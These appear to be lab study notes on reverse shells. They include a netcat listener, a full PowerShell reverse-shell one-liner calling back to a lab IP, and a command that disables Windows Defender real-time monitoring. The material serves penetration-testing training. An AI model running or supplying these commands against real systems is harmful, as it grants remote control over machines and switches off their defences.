
# Reverse Shells

## Overview

A reverse shell involves the target system initiating a connection back to the attacker's machine, which is listening for incoming connections. This method is often favored because outbound connections are less likely to be blocked by firewalls, making it more effective in real-world scenarios.

---

## Why Use Reverse Shells?

- Outbound connections are typically allowed by firewalls.
- Less likely to be detected compared to bind shells.
- Useful when the attacker cannot open inbound ports due to network restrictions.

---

## Example Setup

### Attacker (Listener)

Start a listener on your attack box:

```bash
LeDaav@htb[/htb]$ sudo nc -lvnp 443
```


- Listening on port 443 (commonly used for HTTPS to evade detection).

### Target (Victim)

On the Windows target, execute a PowerShell command to connect back:

```powershell
powershell

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- This script creates a TCP connection to the attacker's IP and port.
- It then pipes commands from the attacker to the target and sends back the output.

---

## Handling Antivirus Detection

- Antivirus software like Windows Defender may block the script.
- To bypass, disable real-time monitoring:

```powershell
powershell

Set-MpPreference -DisableRealtimeMonitoring $true
```

- After disabling AV, re-run the payload.

---

## Example Walkthrough

1. **Start listener on attack box:**

```bash
bash

LeDaav@htb[/htb]$ sudo nc -lvnp 443
```

2. **Run PowerShell payload on Windows target:**

```powershell
powershell

powershell -nop -c "<reverse shell script>"
```

3. **Observe connection:**

- The attacker's netcat session receives a prompt:

```bash
bash

PS C:\Users\htb-student> whoami
ws01\htb-student
```

- The attacker now has control over the Windows system with a command prompt or PowerShell session.

---

## Summary

- Reverse shells are effective for bypassing inbound firewall restrictions.
- They rely on the target initiating outbound connections.
- Disabling antivirus temporarily may be necessary to execute payloads.
- Always practice in controlled environments and respect legal boundaries.
